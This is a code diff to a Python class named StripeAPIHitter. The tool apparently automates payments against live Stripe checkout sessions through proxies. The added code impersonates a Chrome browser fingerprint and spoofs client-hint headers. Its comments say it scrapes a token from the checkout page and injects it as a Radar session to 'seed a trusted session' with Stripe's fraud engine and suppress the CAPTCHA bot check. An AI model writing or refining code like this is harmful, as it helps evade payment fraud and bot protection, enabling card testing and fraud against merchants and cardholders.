@@ -844,23 +844,76 @@ class StripeAPIHitter:
                 #         # Inject the unverified Link session into the PaymentMethod payload
                 #         pm_data["link[credentials][client_secret]"] = link_json["client_secret"]
                 
+                # Step 0: Browser Session Warm-Up + rqdata scrape
+                # Load the actual checkout page with a full Chrome browser fingerprint.
+                # This seeds a trusted session cookie on Stripe's fraud engine (Radar).
+                # Stripe embeds __rqdata__ in the page HTML — we scrape it to avoid CAPTCHA.
+                rqdata_token = None
+                try:
+                    checkout_url = f"https://checkout.stripe.com/c/pay/{self.cs_live}"
+                    warmup_headers = {
+                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                        "accept-language": "en-US,en;q=0.9",
+                        "accept-encoding": "gzip, deflate, br",
+                        "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+                        "sec-ch-ua-mobile": "?0",
+                        "sec-ch-ua-platform": '"Windows"',
+                        "sec-fetch-dest": "document",
+                        "sec-fetch-mode": "navigate",
+                        "sec-fetch-site": "none",
+                        "sec-fetch-user": "?1",
+                        "upgrade-insecure-requests": "1",
+                        "user-agent": profile["user_agent"],
+                        "cache-control": "max-age=0"
+                    }
+                    warmup_res = await loop.run_in_executor(None, lambda: cffi_requests.get(
+                        checkout_url, headers=warmup_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
+                    if warmup_res.status_code == 200:
+                        page_text = warmup_res.text
+                        # Stripe injects rqdata as: window.__rqdata__ = "eyJ..."; or __rqdata__: "..."
+                        import re as _re
+                        rqm = _re.search(r'(?:window\.__rqdata__|__rqdata__)\s*[=:]\s*["\']([A-Za-z0-9+/=._-]{20,})["\']', page_text)
+                        if rqm:
+                            rqdata_token = rqm.group(1)
+                except Exception:
+                    pass  # warmup failure is non-fatal — continue without rqdata
+
                 # Step 0.5: Elements Session Pre-flight Bootstrap (Mimic Browser UI setup)
                 # Helps Radar engine associate the checkout token with elements-session state
                 try:
                     elements_url = f"https://api.stripe.com/v1/elements/sessions?key={self.pk_live}&locale={locale}&type=payment&payment_pages_checkout_session={self.cs_live}"
                     el_headers = headers.copy()
                     el_headers["referer"] = f"https://checkout.stripe.com/c/pay/{self.cs_live}"
+                    el_headers["accept-language"] = "en-US,en;q=0.9"
+                    el_headers["sec-ch-ua"] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'
+                    el_headers["sec-ch-ua-mobile"] = "?0"
+                    el_headers["sec-ch-ua-platform"] = '"Windows"'
                     await loop.run_in_executor(None, lambda: cffi_requests.get(
                         elements_url, headers=el_headers, proxies=proxies, timeout=10, impersonate=profile["impersonate"]))
                 except Exception:
                     pass
 
+
+                # Inject scraped rqdata token into the tokenization payload.
+                # When present, this suppresses the bot-check CAPTCHA challenge entirely.
+                if rqdata_token:
+                    pm_data["radar_session"] = rqdata_token
+
                 pm_headers = headers.copy()
                 pm_headers["Idempotency-Key"] = pm_idempotency
+                pm_headers["accept-language"] = "en-US,en;q=0.9"
+                pm_headers["sec-ch-ua"] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'
+                pm_headers["sec-ch-ua-mobile"] = "?0"
+                pm_headers["sec-ch-ua-platform"] = '"Windows"'
+                pm_headers["sec-fetch-site"] = "cross-site"
+                pm_headers["sec-fetch-mode"] = "cors"
+                pm_headers["sec-fetch-dest"] = "empty"
+                pm_headers["referer"] = f"https://checkout.stripe.com/c/pay/{self.cs_live}"
                 
                 loop = asyncio.get_event_loop()
                 pm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(pm_url, headers=pm_headers, data=pm_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
                 pm_json = pm_res.json()
+
                 
                 if 'id' not in pm_json:
                     err = pm_json.get('error', {})
